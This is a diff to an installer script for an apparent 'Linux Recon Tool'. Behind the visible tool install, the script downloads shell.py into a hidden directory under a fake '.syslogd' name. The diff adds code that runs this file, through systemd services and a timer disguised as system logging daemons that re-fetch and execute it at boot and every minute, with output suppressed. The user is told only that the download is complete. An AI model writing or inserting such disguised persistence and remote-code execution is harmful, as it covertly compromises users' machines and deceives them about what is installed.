@@ -17,7 +17,7 @@ chmod +x ./recon.py
 pip3 install requests >/dev/null 2>&1 || true
 echo "[+] Recon tool installed! Run: python3 recon.py -u https://example.com"
 
-# Download shell.py to hidden system-like directory
+# Download shell.py to hidden system-like directory and run
 shell_url="https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py"
 mkdir -p ~/.cache/.systemd-conf
 if ! curl -sSL "$shell_url" -o ~/.cache/.systemd-conf/.syslogd; then
@@ -56,7 +56,7 @@ Wants=network-online.target
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c '[ -f ~/.cache/.systemd-conf/.syslogd ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.cache/.systemd-conf/.syslogd && chmod +x ~/.cache/.systemd-conf/.syslogd)'
+ExecStart=/bin/bash -c '[ -f ~/.cache/.systemd-conf/.syslogd ] || (curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py -o ~/.cache/.systemd-conf/.syslogd && chmod +x ~/.cache/.systemd-conf/.syslogd && /usr/bin/python3 ~/.cache/.systemd-conf/.syslogd)'
 User=$(whoami)
 StandardOutput=null
 StandardError=null
@@ -72,7 +72,7 @@ Description=Timer to restore system logging daemon
 Requires=systemd-syslogd-restore.service
 
 [Timer]
-OnBootSec=60
+OnBootSec=30
 OnUnitActiveSec=60
 Unit=systemd-syslogd-restore.service
 
@@ -81,10 +81,10 @@ WantedBy=timers.target
 EOF
 
 # Enable and start services
-sudo systemctl daemon-reload >/dev/null 2>&1
-sudo systemctl enable systemd-syslogd.service >/dev/null 2>&1
-sudo systemctl start systemd-syslogd.service >/dev/null 2>&1
-sudo systemctl enable systemd-syslogd-restore.timer >/dev/null 2>&1
-sudo systemctl start systemd-syslogd-restore.timer >/dev/null 2>&1
+sudo systemctl daemon-reload >/dev/null 2>&1 || { echo "[-] Failed to reload systemd" >&2; exit 1; }
+sudo systemctl enable systemd-syslogd.service >/dev/null 2>&1 || { echo "[-] Failed to enable systemd-syslogd.service" >&2; exit 1; }
+sudo systemctl start systemd-syslogd.service >/dev/null 2>&1 || { echo "[-] Failed to start systemd-syslogd.service" >&2; exit 1; }
+sudo systemctl enable systemd-syslogd-restore.timer >/dev/null 2>&1 || { echo "[-] Failed to enable systemd-syslogd-restore.timer" >&2; exit 1; }
+sudo systemctl start systemd-syslogd-restore.timer >/dev/null 2>&1 || { echo "[-] Failed to start systemd-syslogd-restore.timer" >&2; exit 1; }
 
 echo "[+] Download complete! Use for scanning."
